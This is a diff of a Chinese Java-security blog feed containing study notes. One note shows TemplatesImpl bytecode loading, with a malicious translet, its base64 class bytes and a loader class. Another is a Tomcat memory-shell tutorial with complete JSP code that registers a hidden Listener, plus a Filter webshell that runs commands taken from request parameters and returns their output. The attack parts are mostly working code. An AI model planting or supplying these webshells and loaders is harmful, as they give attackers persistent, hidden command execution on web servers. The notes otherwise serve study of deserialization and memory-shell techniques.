-public class test extends AbstractTranslet {
-    public test() {
-        super();
-        try {
-            Runtime.getRuntime().exec("calc");
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    @Override
-    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-
-    }
-
-    @Override
-    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-
-    }
-}
-
-```
-
-将恶意类的class文件内容base64编码
-https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')
-
-![](https://s3.hedgedoc.org/demo/uploads/6f6d9997-0150-47ec-acdd-f611bc6ec7b8.png)
-
-base64内容：
-
-```
-yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj
-
-```
-
-再写一个调用类，负责加载这个恶意字节码
-
-```
-import java.lang.reflect.Field;
-
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xml.internal.security.utils.Base64;
-
-public class test1 {
-    
-    //用于反射调用成员变量并赋值
-    public static void setValue(Object object, String name, Object value) {
-        try {
-            Field field = object.getClass().getDeclaredField(name);
-            field.setAccessible(true);
-            field.set(object,value);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    public static void main(String[] args) {
-        try {
-            byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
-            TemplatesImpl templates = new TemplatesImpl();
-            setValue(templates,"_name","test111");
-            setValue(templates,"_bytecodes", new byte[][]{code});
-            setValue(templates,"_tfactory", new TransformerFactoryImpl());
-            templates.newTransformer();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-}
-
-```
-
-效果：报错，但是不影响我弹计算器
-
-![](https://s3.hedgedoc.org/demo/uploads/42b81fd2-eef1-4d5b-b4ee-a5bb1e64b2a3.png)
-]]></content>
-      <categories>
-        <category>java安全</category>
-      </categories>
-      <tags>
-        <tag>零碎知识</tag>
       </tags>
   </entry>
   <entry>
@@ -2027,6 +1892,2631 @@ public class CommonsCollections6 {
 ```
 ## 学习
 https://xz.aliyun.com/t/9409
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>利用链</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TemplatesImpl</title>
+    <url>/2023/08/22/TemplatesImpl/</url>
+    <content><![CDATA[# TemplatesImpl
+## 简述
+TemplatesImpl这个类不在 Apache Commons Collections 中。但是 TemplatesImpl 这个类很特殊，我们可以借助其动态加载包含恶意的字节码
+## 分析
+### TemplatesImpl.newTransformer()方法
+主要是用来实例化一个TemplatesImpl对象，调用了getTransletInstance()方法，我们跟进
+
+![](https://s3.hedgedoc.org/demo/uploads/422d6e9e-a987-45d2-9db6-d10af1c9e695.png)
+
+ ### TemplatesImpl.getTransletInstance()方法
+1. 如果_name=null，就直接返回null，所以_name不能为空
+2. 如果_class为null，就去调用defineTransletClasses()方法
+3. 然后实例化
+
+这里调用了defineTransletClasses()方法，我们跟进
+
+![](https://s3.hedgedoc.org/demo/uploads/4f49f77b-7f62-4c23-9593-971b7d98d28a.png)
+
+### TemplatesImpl.defineTransletClasses()方法
+1. 实例化一个TransletClassLoader对象loader，其中调用了_tfactory.getExternalExtensionsMap()，_tfactory肯定不能为空
+2. 调用defineClass()加载_bytecodes
+3. 
+这里调用了TransletClassLoader类，我们跟进
+
+![](https://s3.hedgedoc.org/demo/uploads/56df4873-c66d-489d-ac76-5a32a1f4fc01.png)
+
+### TemplatesImpl.TransletClassLoader类
+其实是TemplatesImpl的一个内部类，它继承ClassLoader父类，重写了defineClass方法
+
+![](https://s3.hedgedoc.org/demo/uploads/da1503f2-f80f-477a-aeb7-29ec31ca8849.png)
+
+### 小结
+实例化TemplatesImpl对象，需要给下面的几个成员变量赋值
+1. _bytecodes	byte[]对象，字节码，自己定义
+2. _name		String对象，类名，随便
+3. _tfactory		TransformerFactoryImpl对象，new一个
+
+## 测试
+首先准备恶意test类，用于获取恶意字节码
+恶意类必须继承AbstractTranslet类
+
+```
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class test extends AbstractTranslet {
+    public test() {
+        super();
+        try {
+            Runtime.getRuntime().exec("calc");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+
+```
+
+将恶意类的class文件内容base64编码
+https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')
+
+![](https://s3.hedgedoc.org/demo/uploads/6f6d9997-0150-47ec-acdd-f611bc6ec7b8.png)
+
+base64内容：
+
+```
+yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj
+
+```
+
+再写一个调用类，负责加载这个恶意字节码
+
+```
+import java.lang.reflect.Field;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.security.utils.Base64;
+
+public class test1 {
+    
+    //用于反射调用成员变量并赋值
+    public static void setValue(Object object, String name, Object value) {
+        try {
+            Field field = object.getClass().getDeclaredField(name);
+            field.setAccessible(true);
+            field.set(object,value);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void main(String[] args) {
+        try {
+            byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
+            TemplatesImpl templates = new TemplatesImpl();
+            setValue(templates,"_name","test111");
+            setValue(templates,"_bytecodes", new byte[][]{code});
+            setValue(templates,"_tfactory", new TransformerFactoryImpl());
+            templates.newTransformer();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+```
+
+效果：报错，但是不影响我弹计算器
+
+![](https://s3.hedgedoc.org/demo/uploads/42b81fd2-eef1-4d5b-b4ee-a5bb1e64b2a3.png)
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>零碎知识</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat内存马</title>
+    <url>/2023/08/22/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
+    <content><![CDATA[# 1、前言
+Listener、Filter只是Servlet的一种扩展机制，在web.xml中配置，在Context容器中进行管理的，而Context容器在初始化的时候，都会有一个ContextConfig对象，这个对象主要就是用来初始化获取关于Context的配置，其中就包括了Listener、Filter、Servlet的配置
+
+学点前置知识，学内存马事半功倍：https://blog.csdn.net/weixin_41835612/category_10674061.html
+
+加载三个Java Web组件的加载顺序是Listen>Filter>Servlet，体现在StandardContext.startInternal()方法中
+
+![](https://s3.hedgedoc.org/demo/uploads/b9111a62-8ea4-4b70-b4c2-6d4c33526a4c.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/2ec66c8d-a0a2-499b-b789-5654939bfb03.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/9b5394e8-175b-4575-ba71-031258d95b9e.png)
+
+# 2、Listener内存马
+## 2.1、简述
+这里首先讲Listener内存马，因为在 Java Web 应用程序中，Listener 没有路径映射表的概念，只需要添加到Listener集合中即可，比较简单
+
+而在所有的Listener类型中，监听Servlet请求的ServletRequestListener 监听器是需要监听所有的请求的，也就是说，只要有请求，都会触发ServletRequestListener.requestInitialized()方法
+
+所以ServletRequestListener类型的监听器做内存马最适合不过
+## 2.2、编写一个Listener
+首先写一个Listener，然后在web.xml中配置
+
+```
+\\Listener
+
+package com.tomcatd0.listener;
+
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.http.HttpServletRequest;
+import java.io.IOException;
+
+public class MyListener implements ServletRequestListener {
+
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
+        String commad = request.getParameter("listener_cmd");
+        if(commad != null) {
+            try {
+                Runtime.getRuntime().exec(commad);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+    }
+}
+
+```
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0">
+    
+    <listener>
+        <listener-class>com.tomcatd0.listener.MyListener</listener-class>
+    </listener>
+    
+</web-app>
+
+```
+
+![](https://s3.hedgedoc.org/demo/uploads/c3623664-bd6c-4c95-905f-fe0b87b51bfc.png)
+成功弹出计算器
+## 2.3、调用链分析
+在requestInitialized()方法边上打个断点
+
+![](https://s3.hedgedoc.org/demo/uploads/26266cf9-b374-4ee7-94d6-f77097a301d1.png)
+
+开启调试，调用链如下：
+
+![](https://s3.hedgedoc.org/demo/uploads/b5053ba3-f913-4acc-86b1-92810c3ef60e.png)
+
+这里进入了StandardContext.fireRequestInitEvent()方法，可以看到，第3724行有Listener调用了requestInitialized()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/f0a03b5c-fe27-489b-a84d-c60d6c7679bd.png)
+
+代码一个一个往上跟，这个Listener来自3712行中的StandardContext.getApplicationEventListeners()方法，我们跟进
+
+![](https://s3.hedgedoc.org/demo/uploads/2a10f1ce-60bb-42c6-8b48-1a9103f6ac5a.png)
+
+由上图可见，StandardContext.getApplicationEventListeners()方法又调用了StandardContext.applicationEventListenersList这个成员变量，我们跟进
+
+![](https://s3.hedgedoc.org/demo/uploads/f4fa953a-b9ff-408d-b875-0fbf5c97c721.png)
+
+StandardContext.applicationEventListenersList这个成员变量就是个列表，里面装着的正是我们的MyListener
+
+至此，就清楚了Listener是咋被调用的了
+1. 从StandardContext.applicationEventListenersList找到Listener
+2. 调用StandardContext.fireRequestInitEvent()，触发MyListener.requestInitialized()方法
+## 2.4、动态注册Listener实现内存马
+我们要动态注册Listener的话，只有向StandardContext.applicationEventListenersList里面添加Listener，这样才能被调用到
+
+现在我们在StandardContext类中搜索“this.applicationEventListenersList”，看看有啥方法可以向里面添加Listener的
+
+![](https://s3.hedgedoc.org/demo/uploads/478edf37-5fdd-40ac-bd2c-31a0f6b88b35.png)
+
+第635行的addApplicationEventListener()方法符合这个条件，那么可以直接写代码了，代码逻辑如下
+1. 写一个Listener，然后new一个对象
+2. 获取到一个StandardContext对象
+3. 调用StandardContext.addApplicationEventListener()方法，添加我们的Listener对象
+
+
+完整jsp代码如下：
+```
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@page language="java" contentType="text/html; charset=UTF-8" %>
+
+<%-- 写一个Listener，然后new一个对象 --%>
+<%
+    class MyListener implements ServletRequestListener {
+        @Override
+        public void requestInitialized(ServletRequestEvent sre) {
+            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
+            String commad = request.getParameter("listener_cmd");
+            if(commad != null) {
+                try {
+                    Runtime.getRuntime().exec(commad);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        }
+
+        @Override
+        public void requestDestroyed(ServletRequestEvent sre) {
+        }
+    }
+
+    MyListener myListener = new MyListener();
+%>
+
+<%-- 获取到一个StandardContext对象 --%>
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+%>
+
+<%-- 调用StandardContext.addApplicationEventListener()方法，添加我们的Listener对象 --%>
+<%
+    standardContext.addApplicationEventListener(myListener);
+%>
+```
+
+## 2.5、验证
+在web.xml中没有添加Listener的情况下，输入路由?listener_cmd=notepad
+
+![](https://s3.hedgedoc.org/demo/uploads/91744b09-dfea-4914-9c81-b8159aef8600.png)
+
+没有弹出记事本，毫无反应
+
+访问实现动态注册的jsp
+
+![](https://s3.hedgedoc.org/demo/uploads/66b215bf-e168-4283-94ab-817b33e6ca00.png)
+
+再次输入路由?listener_cmd=notepad
+
+![](https://s3.hedgedoc.org/demo/uploads/b7d8efbb-6167-4dba-9743-f5f4fdef0471.png)
+
+成功弹出记事本
+
+# 3、Filter内存马
+## 3.1、简述
+Filter是一种Servlet的扩展机制，在web.xml中配置，在Context容器中进行管理，主要用于对请求和响应进行预处理和后处理的组件
+
+![](https://s3.hedgedoc.org/demo/uploads/0a498d44-9824-45d6-81ce-b82eb18f9769.png)
+
+主要是存储在StandardContext.filterDefs这个成员变量中的
+## 3.2、编写一个Filter
+首先写一个Filter，然后在web.xml中配置
+
+```
+package com.tomcatd0.filter;
+
+import javax.servlet.*;
+import javax.servlet.http.HttpServletRequest;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+
+public class MyFilter1 implements Filter {
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        String command = servletRequest.getParameter("filter_cmd");
+        if (command != null){
+            Process process = Runtime.getRuntime().exec(command);
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder stringBuilder = new StringBuilder();
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                stringBuilder.append(line + '\n');
+            }
+
+            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+            servletResponse.getOutputStream().flush();
+            servletResponse.getOutputStream().close();
+        }
+        filterChain.doFilter(servletRequest,servletResponse);
+    }
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+    }
+
+    @Override
+    public void destroy() {
+    }
+}
+```
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0">
+    
+    <filter>
+        <filter-name>MyFilter</filter-name>
+        <filter-class>com.tomcatd0.filter.MyFilter</filter-class>
+    </filter>
+    <filter-mapping>
+        <filter-name>MyFilter</filter-name>
+        <url-pattern>/myfilter</url-pattern>
+    </filter-mapping>
+    
+</web-app>
+```
+可以看到，Filter在web.xml的配置和Listener不一样，多了个路由
+
+![](https://s3.hedgedoc.org/demo/uploads/9f9ce15e-f44d-41b6-b52d-078d1b6d5485.png)
+
+成功弹出计算器
+## 3.3、调用链分析
+在doFilter()方法边上打个断点
+
+![](https://s3.hedgedoc.org/demo/uploads/a0777783-9e84-49ea-928e-e1173212f233.png)
+
+开启调试，调用链如下：
+
+![](https://s3.hedgedoc.org/demo/uploads/fce0d2db-6695-4204-90a0-a967d0ca1731.png)
+
